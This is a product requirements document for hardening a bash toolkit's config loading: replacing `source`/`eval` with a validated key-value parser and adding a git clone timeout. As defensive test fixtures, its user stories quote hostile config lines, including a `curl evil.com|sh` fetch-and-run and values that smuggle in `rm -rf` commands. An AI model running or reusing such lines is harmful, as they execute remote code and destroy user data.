**Decision**: SHIP the 4th-arg `<key_case>` parameter in v1.0 with values `upper` (default — matches FR-1 regex `^[A-Z_][A-Z_0-9]*=...$`) and `lower` (version-file site — `^[a-z_][a-z_0-9]*=...$`) ONLY. NOT `mixed`.
**Rationale**: the version-file lowercase contract is fixed by the existing writer; the canonical-12 personalization site is fixed at uppercase. There is NO mixed-case site. Shipping `mixed` invites a future caller to load case-insensitive content — the security improvement is illusory in mixed-case (an attacker substitutes lowercase for uppercase or vice-versa to slip past a whitelist that's case-sensitive in one direction). Two sharp, documented modes.
**Folded into**: FR-1 (lowercase regex variant + defensive `printf -v` identifier check per H-1), FR-3 (call uses `aod_template_load_kv_file "$path" "" "" lower`).

### Q-3 (Architect Pass 1) — RESOLVED → Option (a) — 60s default; `AOD_FETCH_TIMEOUT=0` REJECTED with exit 1

**Adjudicator**: Architect (Pass 1 review).
**Decision**: 60s default; `AOD_FETCH_TIMEOUT=0` REJECTED with exit 1 as invalid input. Regex `^[1-9][0-9]*$` excludes `0`, leading-zero values, negatives, and non-integers.
**Rationale**: F-2's stated threat model is "indefinite hang in CI". Permitting `=0` to mean "no timeout" reintroduces the failure mode F-2 is closing — adopters can set this in shell rc without realizing they've disabled the protection (footgun). The escape hatch already exists for legitimate slow-network: `AOD_FETCH_TIMEOUT=600` or any positive integer. PRD already specifies Option (a) as default; ADR-040 §Decision documents the footgun framing.
**Folded into**: FR-6 (validation regex + rejection); ADR-040 §Decision (footgun rationale documented).

### Q-4 (Team-Lead + Architect concur) — RESOLVED → Option (a) — Sibling file `.aod/scripts/bash/template-config-load.sh`

**Adjudicator**: Team-Lead (Pass 1 review). Architect concurs (Pass 1 — placement is architectural; F-1 precedent).
**Decision**: New file at `.aod/scripts/bash/template-config-load.sh` (sibling to `template-substitute.sh`, `template-git.sh`, `template-validate.sh`, `init-input.sh`).
**Rationale**: F-1 set the precedent (sibling `init-input.sh`); deviation requires explicit justification, not present here. Co-locating with `template-validate.sh` would conflate two different concerns (validate does path safety + symlink rejection + residual-placeholder scan; config-load does KV parsing + assignment). Mixing creates a 600+ line file with 6+ unrelated functions; harder to test in isolation. Total bash-library count goes from 5 to 6 — within reasonable bounds. Standalone sourced file is the cleanest unit-test surface.
**Folded into**: FR-1 (file path), Deliverables (NEW file).

### Q-5 (Team-Lead + Architect concur) — RESOLVED → Tiered ladder per PRD draft, with refinements (per-file delta, canonical fixture set, micro-opt rejected)

**Adjudicator**: Team-Lead (Pass 1 review). Architect concurs with refinements.
**Decision**: Endorse PRD's threshold ladder (≤5% no-op; 5-25% loosen NFR-4 to 25%; 25-50% loosen + Architect re-confirm + accept-and-document with security tradeoff; >50% PM escalate for re-scope). Refinements:
- ADR-040 §Consequences MUST include canonical fixture set (4 real config files: `stacks/nextjs-supabase/defaults.env`, `stacks/fastapi-react/defaults.env`, recorded-valid `aod-kit-version`, recorded-valid `personalization.env`).
- Methodology: 100 invocations × 4 fixtures × p50/p95.
- Per-file delta (NOT aggregate — a 100% slowdown on one file averaged with 0% on three others would mask the regression).
- Awk micro-optimization REJECTED (BSD vs GNU awk variance + complexity creep on a security-load primitive that must be audit-readable).
**Rationale**: Per-line regex match + per-line whitelist lookup + `printf -v` is O(N) where N is line count. For N<20 (canonical fixtures), even a 10× per-line constant factor is sub-millisecond. F-1's perf delta was +658% and accepted on "init runs once per project; correctness over throughput" rationale. F-2's surface is even more bounded. Micro-optimization defeats audit-readability goal — if necessary, ships in a follow-on with its own ADR amendment.
**Folded into**: NFR-4 (tightened wording), SC-10 (benchmark methodology — 100 invocations, p50+p95, per-file delta, warm/cold cache), FR-7 (ADR-040 §Consequences entry).

### Q-6 (Architect Pass 1) — RESOLVED → Proposed → Accepted dual-commit pattern (per F-1 ADR-038 precedent)

**Adjudicator**: Architect (Pass 1 review).
**Decision**: ADR-040 ships in two commits — first commit lands `Status: Proposed` during Stream 3 (early in build), second commit promotes to `Status: Accepted` after Stream 5 verification (post-CI matrix green, pre-merge). Dual-commit pattern matches F-1's ADR-038 (Wave 3 T034 Proposed; Wave 5 T036 Accepted).
**Rationale**: lets reviewers see the ADR's intent early without committing the project to it irrevocably; the Accepted promotion happens only after empirical verification. ADR-040 §Decision Item 2 (the regex) needs benchmark numbers from SC-10 to be complete — those are produced in Stream 5; Accepted promotion folds them in. Single-commit Accepted at merge would lose the deliberation trail.
**Folded into**: FR-7 (dual-commit pattern preserved), tasks.md decomposition (T-X.1 Proposed; T-X.2 Accepted).

---

## 🎯 Strategic Alignment

### Product Vision Alignment

**Reference**: [docs/product/01_Product_Vision/product-vision.md](../01_Product_Vision/product-vision.md)

tachi's positioning is *"the upstream machine-readable contract that AI security point tools consume"* — and the upstream contract must itself ship clean. F-1 closed the most visible substitution-surface gap; F-2 closes the **less-visible-but-equally-load-bearing** config-load surface. An enterprise security architect doing a pre-sales review who runs `grep -rn "source " .aod/ scripts/" against the post-F-1 / pre-F-2 tree will find five `source` invocations and three `eval` invocations across the bash library — each one a procurement-stopping question. F-2 closes that surface in one coherent commit and makes the answer to "where does tachi parse untrusted config files?" be "through one canonical hardened primitive, ADR-040, with a public artifact trail."

### BLP-02 Initiative Fit

F-2 is **Wave 2 / Feature 2 of 5** in BLP-02 (Enterprise Hardening Initiative), opened 2026-05-02 in direct response to Daniel Wood's LinkedIn note. The five-feature blueprint as of 2026-05-04:

```
Wave 1 — Substitution surface (P1) ✓ DELIVERED 2026-05-04
  F-1 (#248) — Substitution Surface Hardening
       │ closed: TACHI-VULN-6bc17fd01ac8 (HIGH) + 4 related findings
       │ ADR-038 ✓ Accepted
       │
  F-250 (Wave 1 follow-on hot-fix) ✓ DELIVERED 2026-05-04
       │ ADR-039 ✓ Accepted (test-architecture canon)
       │
Wave 2 — Source-without-validation (THIS FEATURE — P1)
  F-2 (#256) — Source-Pattern Hardening
       │ closes: TACHI-VULN-6f5a95085056 (HIGH), TACHI-VULN-bf5496e9fcdf (HIGH),
       │         TACHI-VULN-9a7512071b4a (MEDIUM), TACHI-VULN-4dc6cf8f88ea (MEDIUM),
       │         TACHI-VULN-851fd6a21ba9 (LOW)
       │ ADR-040 (renumbered from originally-planned ADR-039 after F-250)
       │
Wave 3 — Disclosure channel (P1)
  F-3 — SECURITY.md + private vulnerability reporting
       │ closes: TACHI-VULN-05abc41ad4cc (INFO)
       │
Wave 4 — Enterprise posture (parallel, P1)
  F-4 — Hardened Claude permissions baseline (ADR-041)
  F-5 — Pre-commit secret-scanning defaults (ADR-042)
```

F-2 ships second because Wave 1 closed the highest-severity finding and the most publicly visible (the one Daniel literally named); F-2 closes the next-highest cluster (2 HIGH + 2 MEDIUM + 1 LOW) and builds the library primitive that Wave 3+4 features benefit from — F-3's potential `SECURITY.md` config / F-4's `.claude/settings.json` curation never need to be parsed by tachi's bash library, but if any future BLP feature needs to load adopter-supplied config, `aod_template_load_kv_file` is now the canonical entry point. **F-2 is the load-bearing library bring-up for the rest of BLP-02 and beyond.**

### Constitution Alignment

**Reference**: [.aod/memory/constitution.md](../../.aod/memory/constitution.md)

- **III. Backward Compatibility (NON-NEGOTIABLE):** `aod_template_load_kv_file` accepts the **exact same valid `KEY=value` format** that the four call sites currently parse via `source`. Adopters with valid, well-formed config files see zero behavior change. The semantics change is from "any bash is permitted, including command substitution and arbitrary code" to "only KV pairs whose values match the strict regex are permitted" — this is a strict tightening, but the tightening rejects exactly what was already documented as invalid in `contracts/personalization-schema.md` and the analogous version-file contract. F-1's gitignore-migration precedent applies here: the CHANGELOG entry includes a one-line note for adopters whose config files contain non-KV bash (extremely unlikely; tachi has never documented such usage), with the rejection-error message providing the specific line and content for self-service repair.
- **VIII. Posture-as-Evidence:** F-2 is the visible posture commit that converts five `DETECTED` events to `REMEDIATED` events with full traceability — the kind of evidence enterprise-buyer security architects look for in pre-sales review. ADR-040 documents the architectural decision; CHANGELOG documents the migration; release-please opens the release PR; the `/security` re-scan provides the after-state proof.

---

## 👥 User Stories

### US-256-1 — Adopter running `init.sh` against a tampered stack-pack `defaults.env`

**As an** adopter running `init.sh` against a stack pack contributed by the community (or a stack pack whose `defaults.env` has been tampered with via supply-chain compromise),
**I want** init to parse `defaults.env` as KV pairs against an allowlist, NOT execute it as bash,
**so that** a malicious line like `CUSTOM_HOOK="$(curl evil.com|sh)"` (or a more subtle injection like `TECH_STACK="nextjs"; rm -rf ~/Projects`) is rejected with a clear error and never executes.

**Acceptance**: A fixture stack pack at `stacks/malicious-pack/defaults.env` containing `CUSTOM_HOOK="$(touch /tmp/F-256-pwned)"` (single line, otherwise valid syntax) causes `init.sh` to exit with code 8 and a message naming the line number and the offending content. `/tmp/F-256-pwned` is never created. A second fixture containing valid keys (`TECH_STACK=nextjs`, `CLOUD_PROVIDER=vercel`) loads normally.

### US-256-2 — Maintainer adding a new config-file site in the future

**As a** maintainer of tachi adding a new config-file load site somewhere in the bash library (e.g., a future `personalization.local.env` for adopter-private overrides, or a stack-pack-extension config introduced by some Wave 5+ feature),
**I want** a one-function-call API to load the file safely,
**so that** I don't have to invent a new validation pattern, and so the surface remains canonical.

**Acceptance**: The maintainer's new feature calls `aod_template_load_kv_file <path> <var_prefix> <whitelist>` and inherits regex-validate → reject-on-mismatch → `printf -v` assignment for free. ADR-040 §Decision describes the canonical pattern; new call sites are reviewed against ADR-040 conformance, not against ad-hoc per-site validation logic. No future config-load site introduces a `source` of an unvalidated file.

### US-256-3 — Adopter running `/aod.update` weekly against malformed `aod-kit-version`

**As a** tachi adopter running `/aod.update` weekly (per consumer guide cadence),
**I want** config-file loading to fail loudly if `aod-kit-version` contains malformed content from a partial fetch / disk corruption / supply-chain compromise of the upstream tag,
**so that** I never silently `source` arbitrary content from a corrupted state.

**Acceptance**: A fixture `.aod/aod-kit-version` containing `version='1.0'; rm -rf "$HOME/Projects"` causes `aod_template_read_version_file` to return exit 8 with a message naming the line and content. `$HOME/Projects` is never touched. A second fixture containing valid fields (`version='4.28.0'`, `sha=abc123`, `updated_at=2026-05-04T12:00:00Z`, `upstream_url=...`, `manifest_sha256=...`) loads normally and the per-field validators at `template-git.sh:568+` run as before.

### US-256-4 — Adopter running `/aod.update` in CI with hanging upstream

**As an** adopter running `/aod.update` in a CI runner where the upstream remote hangs (DNS resolves but TCP doesn't, HTTPS handshake stalls, or upstream is intentionally rate-limiting),
**I want** the fetch to time out at 60s (or my configured `AOD_FETCH_TIMEOUT`) rather than hanging indefinitely,
**so that** my CI job fails fast with a clear timeout error and doesn't tie up a runner for the full job-budget window.

**Acceptance**: A test against a fixture upstream that accepts the TCP connection but never responds to the HTTPS handshake causes `aod_template_fetch_upstream` to time out after exactly the configured `AOD_FETCH_TIMEOUT` (test uses 3s for fast CI). The partial checkout at `destdir` is removed; the function returns exit 9. With `AOD_FETCH_TIMEOUT=10`, the same fixture times out at ~10s, not 60s.

### US-256-5 — Security reviewer auditing the source/eval surface for residuals

**As a** security reviewer evaluating whether tachi's bash library has any residual unsanitized `source` / `eval` of untrusted content,
**I want** every `source` of a config-file path AND every `eval` of a key-derived assignment to either (a) be removed in favor of `aod_template_load_kv_file`, or (b) be explicitly justified in ADR-040 §Out-of-Scope,
**so that** the surface has exactly one canonical config-load pattern and the residual `source`/`eval` count is zero (or explicitly enumerated).

**Acceptance**: `grep -rn '\bsource\b\|\beval\b' .aod/scripts/bash/ scripts/init.sh` post-merge surfaces (a) zero unauthorized `source` of config-file paths, (b) zero `eval` of key-derived assignments in `template-substitute.sh`, (c) only the explicit `source .aod/scripts/bash/template-*.sh` library-loading sources at the top of `init.sh` and inside other library files (these are loading TRUSTED, in-repo bash code, not untrusted config). ADR-040 §Out-of-Scope explicitly enumerates the residual library-loading sources and documents why they are not in F-2's scope.

### US-256-6 — Enterprise security architect doing pre-sales review

**As an** enterprise security architect evaluating tachi for procurement,
**I want** to see one coherent commit per closed posture finding (PR + public ADR + CHANGELOG entry + REMEDIATED transitions + release-please trigger), with the same cadence F-1 demonstrated,
**so that** I can verify tachi's posture-claims-to-evidence ratio is consistent across multiple findings, not a one-time fluke.

**Acceptance**: F-2's PR squash-merge is `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout`; ADR-040 is committed in `docs/architecture/02_ADRs/`; `.security/vulnerabilities.jsonl` shows 5 `DETECTED → REMEDIATED` transitions with the merge SHA; release-please opens a release PR within ~30s post-merge. The pre-sales reviewer sees the F-1+F-2 sequence as evidence of repeatable cadence, not a singleton response.

### US-256-7 — Maintainer reviewing `template-substitute.sh` for `eval` removal

**As a** maintainer reviewing `template-substitute.sh` post-merge to confirm the `eval` surface is zero,
**I want** `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` to return `0`,
**so that** any future PR introducing a new `eval` to that file fails review on the canonical-pattern rule.

**Acceptance**: Post-merge, `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` returns `0`. The four current eval sites at `:217, :249, :536, :558` are replaced with `${!var}` indirect expansion (read-side) and `printf -v` (write-side). A pre-merge CI lint rule (NEW) blocks any future `eval` reintroduction in this file.

### US-256-8 — Adopter whose `/aod.update` runs in a TOCTOU race-prone environment

**As an** adopter whose `/aod.update` runs in an environment where another process or the user could race against the personalization snapshot read (e.g., a backup tool that touches `.aod/personalization.env` periodically, or a multi-agent setup where two `/aod.update` invocations could interleave),
**I want** the personalization-env load to read the file once into a buffer and validate-then-assign from the buffer, NOT do a check-then-use-twice pattern,
**so that** an attacker (or a benign racing process) cannot swap the file between validation and use.

**Acceptance**: `aod_template_load_personalization_env` post-F-2 reads `.aod/personalization.env` exactly once (verified by `strace -e openat` showing a single `openat` of the path); the validate-then-assign pass operates on the buffer, not on the file. A test fixture that swaps the file content via a forked process between any two operations within the loader cannot affect the values that land in caller-scope.

---

## 🔧 Functional Requirements

### FR-1 — `aod_template_load_kv_file` library function added

A new sourced file `.aod/scripts/bash/template-config-load.sh` is added with one canonical function:

```
aod_template_load_kv_file <path> <var_prefix> [<allowed_keys_array_name>] [<key_case>]
```

The 4th argument `<key_case>` accepts `upper` (default — matches FR-1 regex's uppercase KEY pattern) or `lower` (version-file site only — same regex with lowercase left-side `^[a-z_][a-z_0-9]*=...$`). NOT `mixed` per Q-2.5 ruling.

**Behavior**:

1. **Argument validation**:
   - `<path>` required and non-empty; if empty, return exit **1** with `[aod] ERROR: aod_template_load_kv_file requires <path>`.
   - `<var_prefix>` required and matches `^[A-Z_][A-Z_0-9]*$` (or empty string for "no prefix"); if invalid, return exit **1**.
   - `<allowed_keys_array_name>` optional; if provided, must name an existing bash array variable (verified via `${!var_name+set}` indirection).
   - `<key_case>` optional; permitted values `upper` (default) or `lower`. Any other value returns exit **1**.

2. **File existence**: if `! -f "$path"`, return exit **3** with `[aod] ERROR: config file does not exist: $path`.

3. **Read once into buffer** (eliminates TOCTOU): `local content; content=$(cat "$path")`. The `cat` invocation is the **single** read of the file path within the function; all subsequent operations are on the in-memory `$content` scalar.

   **TOCTOU mitigation note (per H-2)**: `cat` opens the file once; the attacker race window collapses from "between two operations" to "before cat opens". The mitigation is "no double-read", not "no race" — the residual race window (between the loader being called and `cat` opening the file) is small but non-zero. Defense-in-depth: callers should ensure `.aod/personalization.env` has appropriate permissions (mode 0600) so that only the owning user can write it. ADR-040 §Decision documents the residual race window explicitly for audit clarity.

4. **Per-line iteration mechanism (per B-3)**: iterate `$content` using bash 3.2-compatible here-string + while-read pattern:
   ```bash
   while IFS= read -r line; do
       # CRLF strip — Windows-edited config tolerance
       line="${line%$'\r'}"
       # Leading-whitespace strip — permissive with adopters who indented for readability
       # (path a per Architect B-3; pattern already used at init.sh:217)
       line="${line#"${line%%[![:space:]]*}"}"
       # Skip blank lines
       [ -z "$line" ] && continue
       # Skip comment lines
       [ "${line:0:1}" = "#" ] && continue
       # ... regex match + whitelist check + printf -v assignment
   done <<< "$content"
   ```
   - Sibling code at `template-substitute.sh:380-388` already uses this pattern; reuse for consistency.
   - The `cat "$path"` command-substitution in step 3 strips the trailing newline (bash quirk on `$(...)`); the `<<< "$content"` here-string adds one back, ensuring the last line is iterated regardless of whether the file had a trailing newline.

5. **Per-line validation**: For each non-skipped, post-stripped line:
   - **Upper-case mode (default, when `<key_case>=upper`)**: match against the strict regex:
     ```
     ^[A-Z_][A-Z_0-9]*=("[^"$\\\`]*"|'[^']*'|[A-Za-z0-9._/:@+=-]*)$
     ```
   - **Lower-case mode (when `<key_case>=lower`)**: same shape with lowercase KEY left-side:
     ```
     ^[a-z_][a-z_0-9]*=("[^"$\\\`]*"|'[^']*'|[A-Za-z0-9._/:@+=-]*)$
     ```
   - Regex breakdown:
     - `^[A-Z_][A-Z_0-9]*` (or `[a-z_][a-z_0-9]*` in lower mode) — KEY: uppercase-or-lowercase + underscore + digit, must start with letter/underscore (no leading digit).
     - `=` — literal.
     - `"[^"$\\\`]*"` — double-quoted value, no embedded `"`, `$`, `\`, or backtick (rejects command substitution `$(...)`, parameter expansion `${...}`, escape sequences, and backtick command substitution). **Per B-2 Path R-2 (chosen)**: F-1's `aod_init_read_validated` is amended in F-2's PR to additionally reject `$`, `\`, backtick at the prompt boundary; the writer at `template-substitute.sh:566-571` no longer needs an escape pass; values are guaranteed metachar-free at the F-1 prompt.
     - `|'[^']*'` — single-quoted value, anything except `'` (single-quotes in bash already inhibit interpolation, so embedded `$` etc. are literal — but we preserve the no-embedded-single-quote rule for round-trip safety).
     - `|[A-Za-z0-9._/:@+=-]*` — unquoted value, allowlisted character class only, **zero-or-more (per B-1)** — permits the bare `KEY=` form (empty unquoted value) which is required by the version-file contract (`aod-kit-version` line 1 is literally `version=` when installed off a non-tagged commit per `template-git.sh:441-447`). Rejects spaces, shell metachars, control chars; permits typical version strings, paths, URLs, emails.
     - `$` — end of line.
   - On any line failing the regex: return exit **8** with `[aod] ERROR: malformed line $LINENO in $path: $TRUNCATED_CONTENT` (truncated to 80 chars).
   - **No partial assignment**: validation pass completes (or fails) before any caller-scope variable is set.

6. **Whitelist enforcement** (if `<allowed_keys_array_name>` provided):
   - For each parsed KEY, check membership in the named array.
   - On any KEY not in the whitelist: return exit **8** with `[aod] ERROR: disallowed key '$KEY' in $path (line $LINENO); allowed: $ALLOWED_LIST`.
   - After parsing, verify every KEY in the whitelist is **present** in the parsed set; on missing key, return exit **8** with `[aod] ERROR: required key '$MISSING_KEY' missing from $path; expected: $ALLOWED_LIST`. (This is the exact behavior `aod_template_load_personalization_env` provides today via the missing-key list at `:228-244`; F-2 inherits the contract.)

7. **Assignment via `printf -v`** (NOT eval) — with defensive identifier check (per H-1):
   - **Defensive check**: before `printf -v`, verify `${var_prefix}${KEY}` matches `^[A-Za-z_][A-Za-z_0-9]*$` (covers both upper-mode and lower-mode KEYs combined with any well-formed `<var_prefix>`). If the constructed identifier is invalid (defense against future caller-side bugs that pass a malformed `<var_prefix>` slipping past the step-1 check), abort with exit **1** and an error naming the offending identifier. This is a belt-and-braces safety net: bash's `printf -v` does NOT validate the variable-name shape; an invalid identifier produces a confusing runtime error.
   - For each `(KEY, VALUE)` pair: strip surrounding quotes from `VALUE` if present (single or double); assign via `printf -v "${var_prefix}${KEY}" '%s' "$VALUE"`.
   - The assignment uses the literal string in `$VALUE` — no bash interpretation of metachars at assignment time. This is the architectural inversion: file content is data, not code.

8. **Exit codes** (canonicalized):
   - `0` — success; all keys assigned in caller scope.
   - `1` — argument error (including invalid `<key_case>` or constructed-identifier failing defensive check).
   - `3` — file absent.
   - `8` — validation failure (malformed line, disallowed key, missing whitelisted key).

9. **Bash 3.2 compatibility**: no associative arrays (use indexed array + position lookup for whitelist); no `mapfile` / `readarray` (use `while IFS= read -r line` loop on a here-string `<<< "$content"`); no `${var,,}` lowercasing; no `&>` shorthand. Verified against macOS bash 3.2.57.

**Test coverage**: Stream 5 includes a dedicated `tests/scripts/test_template_config_load_unit.py` exercising the function in isolation (valid input including empty unquoted value, trailing-newline / no-trailing-newline / CRLF / leading-whitespace cases per B-3, each malformed-input class, whitelist behavior, lower-mode regex variant, defensive identifier check, missing-arg behavior, file-absent behavior) — see Test-1 below.

### FR-2 — Refactor `init.sh:106` (defaults.env) with whitelist

`scripts/init.sh:106` currently runs `source "stacks/$SELECTED_PACK/defaults.env"`. The refactored block:

```bash
# F-2 T-NN — replace `source defaults.env` with hardened KV loader.
# Allowed keys derived from contracts/stack-pack-defaults-schema.md (or whichever
# canonical source ADR-040 §Decision points to).
STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)
aod_template_load_kv_file "stacks/$SELECTED_PACK/defaults.env" "STACK_" STACK_PACK_ALLOWED_KEYS
```

Caller-scope variables become `STACK_TECH_STACK`, `STACK_TECH_STACK_DATABASE`, `STACK_TECH_STACK_VECTOR`, `STACK_TECH_STACK_AUTH`, `STACK_CLOUD_PROVIDER`. Downstream code in `init.sh` that today reads `$TECH_STACK` (etc.) directly from `defaults.env` is migrated to read `$STACK_TECH_STACK` (rename pass). The `STACK_` prefix is required (not optional) because it disambiguates stack-pack-derived values from canonical-12 placeholder values (`PROJECT_NAME` etc., which today also flow through caller scope) and prevents accidental cross-namespace collision.

The library source is added at the top of `init.sh` (alongside the existing `template-substitute.sh` and `init-input.sh` sources):

```bash
if [ -f ".aod/scripts/bash/template-config-load.sh" ]; then
  # shellcheck disable=SC1091
  source .aod/scripts/bash/template-config-load.sh
else
  echo -e "${RED}ERROR: .aod/scripts/bash/template-config-load.sh not found${NC}" >&2
  exit 1
fi
```

**Whitelist requirement**: Q-2 (Architect) below adjudicates whether the whitelist is REQUIRED for `init.sh:106` or whether the regex alone is sufficient. Default per this PRD draft: **REQUIRED** (defense-in-depth — a contributed pack adding `MALICIOUS_KEY=value` should be rejected at the whitelist layer even though the value passes the regex).

### FR-3 — Refactor `template-git.sh:561` and `:501` (aod-kit-version)

Two sites in `.aod/scripts/bash/template-git.sh` source the version file:

- `aod_template_read_version_file:561` — primary read path (Site A).
- `aod_template_write_version_file:485-515` — inner round-trip block at `:501` (Site B). **Per H-3 correction**: the function-name reference in v1.0 of this PRD (`aod_template_validate_version_content`) was incorrect — that function does not exist on current `main`. The actual function containing `:501` is `aod_template_write_version_file`'s belt-and-braces inner round-trip block at lines 485-515 (which sources the about-to-be-written tmp file to verify it parses identically).

Both sites are refactored:

```bash
# Site A — :561 in aod_template_read_version_file
local version='' sha='' updated_at='' upstream_url='' manifest_sha256=''
aod_template_load_kv_file "$path" "" "" lower || {
    local rc=$?
    echo "[aod] ERROR: failed to parse version file: $path (exit $rc)" >&2
    return 3
}
# Existing per-field regex validators at :568+ run AFTER load — unchanged.
```

```bash
# Site B — :485-515 in aod_template_write_version_file (inner round-trip block at :501)
# Replace `source "$tmp_path" 2>/dev/null` with a buffered load using lowercase mode.
local validate_rc=0
aod_template_load_kv_file "$tmp_path" "" "" lower || validate_rc=$?
# ... existing post-load missing-field detection, unchanged.
# Round-trip semantics preserved: writer→reader round-trip on every field-shape combination.
```

**No whitelist** at these sites: the version file's allowed-key set (`version`, `sha`, `updated_at`, `upstream_url`, `manifest_sha256`) is **lowercase** by design (matches the writer at `aod_template_write_version_file`). The canonical regex defaults to uppercase KEY pattern; the 4th-arg `<key_case>=lower` parameter (per Q-2.5 ruling) opts into the lowercase variant `^[a-z_][a-z_0-9]*=...$`. **Q-2.5 ruling**: ship `<key_case>` parameter with values `upper` (default) and `lower` ONLY (NOT `mixed`) — the version-file format is the only known site needing lowercase; adding a mixed mode invites case-insensitive content with illusory security. The round-trip validation's `source` is replaced with `aod_template_load_kv_file` (same migration, same exit-code propagation, same lowercase mode).

**Empty value support**: per B-1 resolution, the regex's value alternation accepts empty unquoted (`KEY=` bare form) — required by the version-file contract because `aod-kit-version` line 1 is literally `version=` when installed off a non-tagged commit. The current `/Users/david/Projects/tachi/.aod/aod-kit-version` on this machine (and presumably most adopter installs) demonstrates this state.

### FR-4 — Refactor `template-substitute.sh:217, :249, :536, :558` (eval-based dynamic assignment) + writer escape pass removal at `:566-571` (per B-2 Path R-2 + M-3)

Replace four `eval` invocations with bash 3.2-compatible alternatives:

- **Read-side `eval "val=\"\${$key:-}\""` (lines :217, :536)** → indirect scalar expansion with `:-` default-to-empty (matches the existing eval form at these sites):
  ```bash
  local var_name="$key"
  local val="${!var_name:-}"
  ```
  `${!var}` is bash 3.2 compatible for scalar variables (not arrays — but `$key` here is always a scalar). Strict semantic equivalent at `:217, :249, :536`.

- **Read-side at `:558` — NO `:-` default (per H-4)**: the `:558` site is `eval "val=\"\${$key}\""` — note the absence of `:-` (default-to-empty), unlike `:217, :249, :536`. The function `aod_template_init_personalization` ALREADY validates the key is non-empty at `:535-540` before reaching `:558`, so the difference doesn't matter in current code. Replacement uses `local val="${!var_name}"` (no default) for strict semantic equivalence with current code:
  ```bash
  local var_name="$key"
  local val="${!var_name}"   # No :- default — matches existing :558 semantics
  ```
  The empty-value handling at `:573-575` stays unreachable post-validation (validation at `:535-540` precludes empty `key`). A future maintainer should NOT assume `:-` is always safe to add; the strict form preserves the fail-loud-on-undefined behavior.

- **Write-side `eval "AOD_PERSONALIZATION_${key}=\"\$val\""` (line :249)** → `printf -v`:
  ```bash
  printf -v "AOD_PERSONALIZATION_${key}" '%s' "$val"
  ```
  `printf -v` is bash 3.2 compatible (added in bash 3.1).

- **Writer escape pass removal at `:566-571` (per B-2 Path R-2 + M-3)**: the current writer in `aod_template_init_personalization` escapes `\\`, `"`, `$`, and backtick when wrapping a value in double quotes (so that bash `source` re-reads the literal value). Per B-2 Path R-2 (chosen by PM as architecturally cleanest), this escape pass is **REMOVED in F-2's PR**. F-1's `aod_init_read_validated` is amended to additionally reject `$`, `\`, backtick at the prompt boundary — values are guaranteed metachar-free at the F-1 prompt. The writer just emits `KEY="$val"` directly without escapes:
  ```bash
  # Writer post-F-2 (escape pass removed):
  printf '%s="%s"\n' "$key" "$val" >> "$tmp_path"
  ```
  The reader regex's `"[^"$\\\`]*"` double-quoted alternation rejects unescaped `$`, `\`, backtick — which is now consistent with what the writer produces (because the prompt validator never lets these chars through). Round-trip is preserved without negotiation.

  **F-1 contract amendment**: `aod_init_read_validated` validator is amended in F-2's PR (NOT F-1's) to additionally reject `$`, `\`, backtick. CHANGELOG note tied to F-2 documents this one-time contract amendment. Rationale: this is where the change is required (F-2 is removing the writer's escape pass); putting it in F-1 retroactively would require a F-1 amendment commit.

Post-refactor, `grep -c '\beval\b' .aod/scripts/bash/template-substitute.sh` MUST return `0` (verified by SC-5 and US-256-7 acceptance). Additionally, `grep -c 'escape' .aod/scripts/bash/template-substitute.sh` should show no escape-pass code in the writer (the four-line `\\`/`"`/`$`/backtick escape block at `:566-571` is removed).

### FR-5 — Refactor `template-substitute.sh:162-209` (TOCTOU on personalization.env)

Replace the entire `aod_template_load_personalization_env` function body's subshell-validate-then-caller-source double-read pattern with a single call to `aod_template_load_kv_file`:

```bash
aod_template_load_personalization_env() {
    local path="${1:-}"
    if [ -z "$path" ]; then
        echo "[aod] ERROR: aod_template_load_personalization_env requires <path>" >&2
        return 1
    fi
    aod_template_load_kv_file "$path" "AOD_PERSONALIZATION_" AOD_CANONICAL_PLACEHOLDERS
}
```

Behavior preserved:
- Missing-path → exit 1 (unchanged).
- File-absent → exit 3 (unchanged; was return 3, now via library).
- Validation-failure → exit 8 (unchanged; was return 8 with newline / NUL detection, now via library regex which **implicitly excludes** literal newline and NUL because they don't match the value-class character sets).
- Missing-key detection → exit 8 (unchanged; was the missing-key list, now via whitelist behavior).
- Caller-scope variables `AOD_PERSONALIZATION_<KEY>` populated (unchanged).

The 47 lines of subshell-validate-then-caller-source code at `template-substitute.sh:162-209` collapse to ~7 lines of delegation. Net code reduction with stricter security semantics.

### FR-6 — Clone timeout in `aod_template_fetch_upstream`

`.aod/scripts/bash/template-git.sh:102-104` is wrapped in a portable bash background+kill pattern:

```bash
local fetch_timeout="${AOD_FETCH_TIMEOUT:-60}"
# Validate AOD_FETCH_TIMEOUT is a positive integer
if ! [[ "$fetch_timeout" =~ ^[1-9][0-9]*$ ]]; then
    echo "[aod] ERROR: AOD_FETCH_TIMEOUT must be a positive integer (got: $fetch_timeout)" >&2
    return 1
fi

local clone_rc=0
if [ -n "$ref" ]; then
    git clone --depth=1 --branch "$ref" --quiet "$url" "$destdir" 2>&1 &
else
    git clone --depth=1 --quiet "$url" "$destdir" 2>&1 &
fi
local clone_pid=$!

# Watchdog: sleep then kill the clone PID if still alive
( sleep "$fetch_timeout" && kill -TERM "$clone_pid" 2>/dev/null ) &
local watchdog_pid=$!

wait "$clone_pid"
clone_rc=$?

# If the watchdog fired (clone was killed by SIGTERM, exit 143) → timeout
if [ "$clone_rc" -eq 143 ] || [ "$clone_rc" -eq 130 ]; then
    rm -rf "$destdir" 2>/dev/null
    echo "[aod] ERROR: upstream fetch timed out after ${fetch_timeout}s for url=$url ref=$ref" >&2
    kill "$watchdog_pid" 2>/dev/null
    return 9
fi

# Clean up the watchdog (it may still be running if clone finished fast)
kill "$watchdog_pid" 2>/dev/null
```

**Override semantics**: `AOD_FETCH_TIMEOUT` accepts a positive integer; values like `0` or non-numeric are **rejected** with exit 1 (Q-3 ruling — RESOLVED Option (a)): "no timeout" in CI is the failure mode the feature is preventing. ADR-040 §Decision documents the footgun framing — adopters should not be able to silently disable the protection by setting `=0` in shell rc.

**Bash 3.2 compatibility**: verified — `&`, `wait`, `kill`, `sleep`, command substitution `$(...)`, regex `=~`, brace expansion (none used) are all bash 3.2 compatible. No GNU coreutils `timeout(1)` invoked.

**Edge case — fast clone**: if the clone finishes in <1s, the watchdog `sleep "$fetch_timeout"` is still running; the post-wait `kill "$watchdog_pid" 2>/dev/null` cleans it up. No zombie processes.

